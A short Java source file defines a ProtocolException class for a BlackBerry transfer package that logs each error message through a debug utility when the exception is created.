package com.ht.rcs.blackberry.transfer;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ProtocolException extends Exception {
    static Debug debug = new Debug("ProtocolException", DebugLevel.VERBOSE);

    public ProtocolException(String string) {
        super(string);
        debug.error(string);
    }
}
